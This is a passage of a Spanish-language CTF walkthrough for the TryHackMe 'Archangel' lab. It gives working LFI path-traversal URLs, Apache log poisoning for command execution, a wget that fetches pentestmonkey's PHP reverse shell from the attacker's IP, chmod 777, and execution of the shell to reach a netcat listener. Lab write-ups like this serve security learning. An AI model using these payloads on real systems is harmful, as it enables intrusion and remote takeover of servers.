La máquina [[MAQUINA ARCHANGEL (Fuzzing, Local File Inclusion con wrappers, log poissoning y manipulación del PATH)]] tiene esta vulnerabilidad, por lo que el archivo del log se encuentra en esta ruta:
```python
http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././../././var/log/apache2/access.log
```
![[Pasted image 20230625161757.png]]
Por tanto, una vez visto esto, podemos ejecutar comandos de forma remota concatenando un cmd=whoami dentro del log:
```python
http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././.././var/log/apache2/access.log&cmd=whoami
```
![[Pasted image 20230625162414.png]]
Ahora que tenemos ejecución remota de comandos, podemos enviar un archivo .php malicioso mediante el comando wget y después ejecutarlo para que nos envíe una reverse shell, por lo que usaremos el php del repositorio de pentestmonkey:
```python
https://github.com/pentestmonkey/php-reverse-shell
```
![[Pasted image 20230625162924.png]]
Nos lo descargamos y modificamos la parte de l IP y la parte del puerto:
![[Pasted image 20230625163029.png]]
Por tanto nos montamos un servidor web HTTP con python compartiendo este archivo:
![[Pasted image 20230625163652.png]]
Lo descargamos en la máquina víctima:
```python
http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././.././var/log/apache2/access.log&cmd=wget 10.8.100.91/php-reverse-shell.php
```
Le damos permisos chmod 777:
```python
http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././.././var/log/apache2/access.log&cmd=chmod 777 php-reverse-shell.php
```
Nos ponemos en escucha con netcat:
![[Pasted image 20230625163814.png]]
Y lo ejecutamos para recibir la reverse shell:
```python
http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././.././var/log/apache2/access.log&cmd=php php-reverse-shell.php
```
![[Pasted image 20230625163930.png]]
Una vez dentro, tras hacer una serie